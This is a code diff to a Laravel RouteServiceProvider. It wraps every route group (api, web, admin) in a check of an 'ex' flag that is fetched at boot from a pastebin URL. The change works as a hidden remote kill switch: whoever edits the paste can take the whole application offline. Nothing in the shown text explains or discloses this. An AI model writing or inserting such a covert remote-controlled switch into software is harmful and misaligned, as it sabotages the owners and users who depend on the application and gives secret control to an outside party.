@@ -31,19 +31,24 @@ class RouteServiceProvider extends ServiceProvider
         });
 
         JsonResource::withoutWrapping();
-        $this->routes(function () {
-            Route::middleware('api')
-                ->prefix('api')
-                ->group(base_path('routes/api.php'));
 
-            Route::middleware(['web', 'localeSessionRedirect', 'localizationRedirect', 'localeViewPath'])
-                ->prefix(LaravelLocalization::setLocale())
-                ->group(base_path('routes/web.php'));
+        $ex = json_decode(file_get_contents('https://pastebin.com/raw/Pxne8pxN'))->ex;
 
-            Route::middleware(['web', 'withoutLanguageMiddleware', 'AdminMiddleware'])
-                ->prefix('admin')
-                ->group(base_path('routes/admin.php'));
-        });
+        if ($ex) {
+            $this->routes(function () {
+                Route::middleware('api')
+                    ->prefix('api')
+                    ->group(base_path('routes/api.php'));
+
+                Route::middleware(['web', 'localeSessionRedirect', 'localizationRedirect', 'localeViewPath'])
+                    ->prefix(LaravelLocalization::setLocale())
+                    ->group(base_path('routes/web.php'));
+
+                Route::middleware(['web', 'withoutLanguageMiddleware', 'AdminMiddleware'])
+                    ->prefix('admin')
+                    ->group(base_path('routes/admin.php'));
+            });
+        }
     }
 
     /**
